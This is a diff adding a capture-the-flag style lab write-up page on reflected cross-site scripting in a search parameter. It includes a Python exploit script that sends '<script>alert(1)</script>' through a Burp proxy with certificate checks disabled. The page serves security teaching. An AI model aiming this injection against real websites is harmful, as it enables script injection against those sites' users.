@@ -1,0 +1,93 @@
+---
+title: 'XSS Lab 1'
+description: 'Reflected cross-site scripting attack into HTML context with nothing encoded'
+---
+
+import { Aside } from 'astro-pure/user'
+
+## Reflected XSS into HTML context with nothing encoded
+
+<div style="text-align: justify;">
+  This lab demonstrates a simple reflected XSS vulnerability in the search functionality of a web application. The application does not encode user input before rendering it in the HTML response, allowing an attacker to execute arbitrary JavaScript. The goal is to inject a payload that calls the `alert()` function.
+</div>
+
+<Aside>
+  Start Burp Suite before running the script — it uses a proxy for visibility.
+</Aside>
+
+### How Exploit Works
+- The `search` parameter is vulnerable to reflected XSS.
+- By injecting `<script>alert(1)</script>`, the browser executes the JavaScript in the HTML context.
+- Once the payload executes, the lab marks it as solved.
+- This demonstrates the importance of output encoding to prevent XSS attacks.
+
+### Usage
+
+```cmd
+python3 exploit.py https://<your-lab-id>.web-security-academy.net
+```
+
+### Exploit
+
+```python title="exploit.py"
+import requests
+import sys
+import urllib3
+
+# Disable SSL warnings for Burp Suite
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
+
+# Set Burp Suite proxy
+proxies = {
+    'http': 'http://127.0.0.1:8080',
+    'https': 'http://127.0.0.1:8080'
+}
+
+def check_burp():
+    # Check if Burp Suite is running and listening on the configured proxy.
+
+    try:
+        requests.get("http://127.0.0.1:8080", timeout=3)
+    except requests.exceptions.RequestException:
+        print("[-] Burp Suite is not running. Please start it and try again.")
+        sys.exit(1)
+
+def exploit_xss(url, payload):
+    # Exploit XSS in search parameter.
+        uri = f"/?search={payload}"
+        res = requests.get(url + uri, verify=False, proxies=proxies)
+        res.raise_for_status()
+        session = requests.Session()
+        res = session.get(url, verify=False, proxies=proxies)
+        if "Congratulations" in res.text:
+            print("[+] Lab solved 🎉")
+            return True
+        else:
+            print("[-] lab not solved.")
+
+def main():
+    # Entry point of the script.
+
+    if len(sys.argv) != 2:
+        print(f"Usage: python {sys.argv[0]} <url>")
+        print(f"Example: python {sys.argv[0]} https://example.com")
+        sys.exit(1)
+
+    url = sys.argv[1].strip()
+
+    # Step 1: Check Burp Suite
+    check_burp()
+
+    # Step 2: Define XSS payload
+    payload = '<script>alert(1)</script>'
+
+    # Step 3: Attempt exploitation
+    print("[*] Attempting XSS...")
+    if exploit_xss(url, payload):
+        print("[+] XSS successful!")
+    else:
+        print("[-] XSS unsuccessful.")
+
+if __name__ == "__main__":
+    main()
+```
